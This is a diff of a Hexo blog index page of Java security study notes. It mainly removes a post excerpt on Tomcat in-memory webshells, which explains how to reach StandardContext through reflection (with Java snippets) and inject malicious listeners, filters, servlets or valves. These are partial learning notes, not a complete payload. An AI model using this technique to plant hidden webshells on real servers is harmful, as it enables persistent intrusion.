+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-06-22 16:15:09" itemprop="dateCreated datePublished" datetime="2026-06-22T16:15:09+08:00">2026-06-22</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>0</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/22/weblogic1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -350,279 +737,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/19/memoryshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/19/memoryshell/" class="post-title-link" itemprop="url">内存马</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-06-19 17:28:41 / 修改时间：17:31:06" itemprop="dateCreated datePublished" datetime="2026-06-19T17:28:41+08:00">2026-06-19</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.3k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><em><strong>tomcat内存马</strong></em></p>
-<p>因为在tomcat中资源的分配加载都跟standardcontext有关，所以说内存马就是找到standardcontext，通过standardcontext将恶意的listener，filter，servlet，valve放进去。</p>
-<p>1.listener型：</p>
-<p>有各种不同的listener，其中ServletRequestListener无疑是最好用的。因为它监听的是ServletRequest，访问web网站的任意位置都会触发这个监听器。</p>
-<p>listener存储在<em>applicationEventListenersList</em>，调用<em>standardcontext.addApplicationEventListenersList</em>就好了。因为是<em>tomcat+jsp</em>所以说这里有一个通用的方式去获取<em>standardcontext</em></p>
-<p>ServletContext servletContext &#x3D; request.getServletContext();</p>
-<p>Field applicationContextField &#x3D; servletContext.getClass().getDeclaredField(“context”);</p>
-<p>applicationContextField.setAccessible(true);</p>
-<p>ApplicationContext applicationContext &#x3D; (ApplicationContext) applicationContextField.get(servletContext);</p>
-<p>Field stantardContextField &#x3D; applicationContext.getClass().getDeclaredField(“context”);</p>
-<p>stantardContextField.setAccessible(true);</p>
-<p>StandardContext context &#x3D; (StandardContext) stantardContextField.get(applicationContext);</p>
-<p>2.filter型:</p>
-<p>首先需要对filter的调用流程需要一些了解。</p>
-<p>filter.doFilter-&gt;ApplicationFilterChain.internalDoFilter-&gt;filter.dofilter</p>
-<p>tomcat的filterchain是在每一次的请求中重新组装的</p>
-<p>在ApplicationFilterChain中</p>
-<p>从ApplicationFilterConfig获取filterconfig从filterconfig获取filter</p>
-<p>这是filter的调用流程</p>
-<p>现在需要关心的是filter是怎么放进去的</p>
-<p>关键就是把filterconfig放到ApplicationFilterChain里面</p>
-<p>ApplicationFilterFactory.createFilterChain在这个方法里面有filterChain.addFilter(filterConfig)</p>
-<p>现在就是需要走到这里了。</p>
-<p>这里涉及到几个概念</p>
-<p>filtermaps:我们都知道filter是过滤器，既然是过滤器，那就需要知道在访问哪些地方的时候调用哪个过滤器，他就是干这个工作的。</p>
-<p>filterconfig:对filter的封装，除了filter还有别的一些数据，他是使用filterdef创建的</p>
-<p>filterdef:对于filter的静态定义，用于创建filter。里面记录了 Filter 的名字（filterName）、Filter 对应的实现类（filterClass），以及初始化参数（initParams）</p>
-<p>dispatcher:决定了请求以什么方式到达的时候会调用。</p>
-<p><strong>REQUEST（最常用）：</strong> 只有当客户端<strong>直接发送 HTTP 请求</strong>访问这个 URL 时，才触发 Filter。</p>
-<p><strong>FORWARD：</strong> 当后端代码通过 request.getRequestDispatcher(“&#x2F;target”).forward(request, response) 进行<strong>内部转发</strong>时，才触发 Filter。</p>
-<p><strong>INCLUDE：</strong> 当页面通过 include 包含其他页面时触发。</p>
-<p><strong>ERROR：</strong> 当系统发生错误、跳转到错误处理页面（404&#x2F;500）时触发。</p>
-<p><strong>ASYNC：</strong> 异步请求时触发。</p>
-<p>1.遍历filtermaps获得filtermap，将与这次请求的dispatcher 类型以及url路径相匹配的filterconfig从filterconfigs中拿出来，放入filterchain。</p>
-<p>2.遍历filtermaps获得filtermap，将与这次请求的dispatcher 类型以及servlet名字相匹配的filterconfig从filterconfigs中拿出来，放入filterchain。</p>
-<p>所以说我们得先把filtermap放入filtermaps中再把filterconfig放入filterconfigs中，而filterconfig需要filterdef。这个filterdef也需要放在context中，主要是为了对账，防止检测出没有filterdef但是有filterconfig这种情况。</p>
-<p>3.servlet型：</p>
-<p>4.valve型:</p>
-<p>pipeline有添加valve的方法。</p>
-<p>pipeline可以从每一个小容器中获取（Engine，host，context，wrapper）</p>
-<p><em><strong>Spring内存马</strong></em></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/18/spel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/18/spel/" class="post-title-link" itemprop="url">SpEL</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2026-06-18 23:22:00" itemprop="dateCreated datePublished" datetime="2026-06-18T23:22:00+08:00">2026-06-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-20 17:00:58" itemprop="dateModified" datetime="2026-06-20T17:00:58+08:00">2026-06-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>简单写一下利用原理</p>
-          <!--noindex-->
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/18/spring/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/ctwabc.png">
-      <meta itemprop="name" content="ctwabc">
-      <meta itemprop="description" content="学习笔记">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ctwabc's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/06/18/spring/" class="post-title-link" itemprop="url">spring</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2026-06-18 23:21:51" itemprop="dateCreated datePublished" datetime="2026-06-18T23:21:51+08:00">2026-06-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-19 17:14:24" itemprop="dateModified" datetime="2026-06-19T17:14:24+08:00">2026-06-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -690,7 +808,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -750,7 +868,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">32k</span>
+    <span title="站点总字数">41k</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div><div class="custom-footer">
